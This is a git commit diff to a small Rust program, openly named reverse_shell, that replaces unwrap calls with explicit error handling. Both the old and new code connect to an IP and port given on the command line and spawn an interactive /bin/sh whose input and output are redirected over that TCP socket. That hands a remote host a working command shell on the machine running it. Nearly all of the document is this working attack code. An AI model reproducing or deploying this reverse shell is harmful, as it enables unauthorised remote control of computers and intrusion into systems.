36cbe469327f16da578a4d1c3e5a3acfd51cb6ac
Alex Juarez <karmatr0n.dixit@gmail.com>
2022-07-31 13:40:51 -0500

    Remove unwrap and define the mutable variables

--- reverse_shell/src/main.rs
+++ reverse_shell/src/main.rs
@@ -7,19 +7,33 @@ use std::process::Command;
 
 fn main() {
     let args: Vec<String> = env::args().collect();
+    if args.len() < 2 {
+        panic!("Usage: reverse_shell <IP> <PORT>");
+    }
+
     let ip = &args[1];
     let port = &args[2];
 
-    let tcp_stream = TcpStream::connect(format!("{ip}:{port}")).unwrap();
+    let tcp_stream = match TcpStream::connect(format!("{ip}:{port}")) {
+        Err(why) => panic!("Connection error: {why}"),
+        Ok(tcp_stream) => tcp_stream,
+    };
+
     let raw_fd: RawFd = tcp_stream.as_raw_fd();
 
-    Command::new("/bin/sh")
+    let mut rev_shell = match Command::new("/bin/sh")
         .arg("-i")
         .stdin(unsafe { File::from_raw_fd(raw_fd) })
         .stdout(unsafe { File::from_raw_fd(raw_fd) })
         .stderr(unsafe { File::from_raw_fd(raw_fd) })
         .spawn()
-        .unwrap()
-        .wait()
-        .unwrap();
+    {
+        Err(why) => panic!("Error: {why}"),
+        Ok(child) => child,
+    };
+
+    match rev_shell.wait() {
+        Err(why) => panic!("Error: {why}"),
+        Ok(exit_status) => exit_status,
+    };
 }
